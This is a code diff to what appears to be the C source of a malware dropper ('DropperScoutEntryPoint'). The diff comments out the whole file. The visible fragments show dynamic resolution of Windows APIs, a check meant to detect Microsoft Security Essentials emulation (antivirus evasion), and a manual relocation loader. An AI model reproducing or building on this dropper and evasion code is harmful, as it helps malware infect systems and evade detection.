@@ -1,3 +1,4 @@
+/*
 #pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
 #pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment
 
@@ -39,7 +40,7 @@ int __stdcall DropperScoutEntryPoint(DropperHeader *header)
 	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), strVirtualAlloc);
 	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), strVirtualFree);
 
-	/* Check for Microsoft Security Essential emulation */
+	// Check for Microsoft Security Essential emulation 
 	
 	char *fName = (char *)pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
 	pfn_GetModuleFileName(NULL, fName, MAX_PATH);
@@ -479,3 +480,4 @@ __forceinline void ldr_reloc(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
 
 #pragma code_seg()
 #pragma optimize( "", on )
+*/
